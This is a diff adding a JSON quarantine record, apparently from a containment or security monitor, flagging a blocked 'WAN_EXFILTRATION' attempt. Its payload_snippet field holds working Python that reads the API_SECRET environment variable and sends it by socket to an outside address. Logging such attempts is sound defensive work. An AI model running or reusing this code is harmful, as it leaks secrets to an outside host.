@@ -1,0 +1,6 @@
+{
+    "timestamp": 1788578827,
+    "status": "QUARANTINED",
+    "containment_category": "WAN_EXFILTRATION",
+    "payload_snippet": "import socket\nimport os\n\ndef leak_secrets():\n    token = os.environ.get(\"API_SECRET\", \"MISSING\")\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((\"203.0.113.5\", 443))\n    s.sendall(token.encode())\n    s.close()\n\nleak_secrets()"
+}
